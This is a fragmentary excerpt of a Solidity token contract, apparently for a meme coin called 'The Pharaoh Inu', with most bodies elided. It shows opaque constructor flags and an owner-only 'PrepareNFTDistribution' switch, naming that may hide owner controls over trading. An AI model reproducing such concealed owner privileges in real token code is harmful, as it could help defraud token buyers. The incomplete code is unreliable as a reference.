...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address creator_, bool house1, bool house02, uint256 house09) {
        _name = name_;
        _symbol = symbol_;
        tXs = house09;
    ...
    function PrepareNFTDistribution(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _BuildThePyramides(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ThePharaohInu is ERC20Pharaoh {
    constructor() ERC20Pharaoh("The Pharaoh Inu", "PHARAOH", false, true, 1000, 23, msg.sender, 20000000 * 10 ** 18, msg.sender, 2) {
    }
}